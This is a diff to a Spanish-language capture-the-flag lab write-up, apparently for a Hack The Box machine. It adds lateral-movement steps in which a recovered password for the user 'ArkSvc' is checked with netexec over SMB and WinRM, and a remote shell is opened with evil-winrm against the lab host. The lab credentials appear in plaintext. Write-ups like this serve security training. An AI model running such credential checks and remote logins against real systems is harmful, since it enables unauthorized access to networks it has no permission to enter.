@@ -222,7 +222,7 @@ evil-winrm -i 10.129.9.250 -u 's.smith' -p 'sT333ve2'
 ```
 
 
-# Escalada de privilegios
+# Escalada de privilegios / Movimiento Lateral
 ## Enumeración
 Enumeraremos que privilegios tiene nuestro usuario
 ```shell
@@ -323,4 +323,26 @@ Teniendo ahora todos los valores necesarios como para ver la contraseña en text
 ![[Pasted image 20260305161212.png]]
 
 Utilizaremos la herramienta online de `CiberChef` para pasarle los datos obtenidos
+![[Pasted image 20260305161522.png]]
+
+
+Obteniendo la contraseña del usuario `ArkSvc` que parece ser `w3lc0meFr31nd` la cual validaremos con [[NETEXEC]]
+```shell
+nxc smb 10.129.9.250 -u 'ArkSvc' -p 'w3lc0meFr31nd'
+```
+
+Validando que es un usuario valido
+```ad-hint
+ArkSvc::w3lc0meFr31nd
+```
+
+También vemos que pertenece al grupo de `Remote Management`
+```shell
+nxc winrm 10.129.9.250 -u 'ArkSvc' -p 'w3lc0meFr31nd'
+```
+
+Nos conectamos usando las credenciales
+```shell
+evil-winrm -i 10.129.9.250 -u 'ArkSvc' -p 'w3lc0meFr31nd'
+```
 
